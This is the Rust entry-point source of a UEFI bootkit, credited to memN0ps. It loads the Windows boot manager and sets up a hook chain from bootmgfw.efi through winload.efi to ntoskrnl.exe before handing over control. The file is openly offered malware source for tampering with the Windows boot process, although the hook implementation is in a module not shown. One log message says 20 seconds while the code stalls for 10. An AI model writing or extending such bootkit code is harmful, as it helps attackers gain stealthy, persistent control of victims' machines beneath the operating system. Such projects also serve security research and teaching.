#![no_main]
#![no_std]

use log;
use uefi::prelude::*;

mod boot;

// The image handle represents the currently-running executable, and the system table provides access to many different UEFI services.
#[entry]
fn main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
    // uefi_services is setting a simple memory allocator, initializing the logger, and providing a panic handler.
    uefi_services::init(&mut system_table).unwrap();

    //
    // 0. Clear stdout/stderr output screen
    //
    system_table
        .stdout()
        .clear()
        .expect("Failed to clear the stdout output screen.");
    system_table
        .stderr()
        .clear()
        .expect("Failed to clear the stderr output screen.");

    log::info!("### UEFI Bootkit in Rust by memN0ps ###");

    let boot_services = system_table.boot_services();

    //
    // 1. Locate and load Windows EFI Boot Manager (bootmgfw.efi)
    //

    log::info!("[*] Loading Windows EFI Boot Manager (bootmgfw.efi)");
    let bootmgfw_handle = boot::utils::load_windows_boot_manager_by_buffer(boot_services)
        .expect("Failed to load Windows EFI Boot Manager (bootmgfw.efi)");
    log::info!("[+] Image Loaded Successfully!");

    //
    // 2. Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe
    //

    log::info!("[*] Setting up hooks: bootmgfw.efi -> windload.efi -> ntoskrnl.exe");
    boot::hooks::setup_hooks(&bootmgfw_handle, &boot_services);
    log::info!("[+] Hooks setup Successfully!");

    //
    // 3. Start Windows EFI Boot Manager (bootmgfw.efi)
    //

    log::info!("[*] Starting image");
    if let Err(e) = boot_services.start_image(bootmgfw_handle) {
        log::info!("[-] Failed to start image: {:?}", e);
        system_table.boot_services().stall(5_000_000);
        return Status::UNSUPPORTED;
    }

    // Make the system pause for 10 seconds
    log::info!("Stalling the processor for 20 seconds");
    system_table.boot_services().stall(10_000_000);
    Status::SUCCESS
}
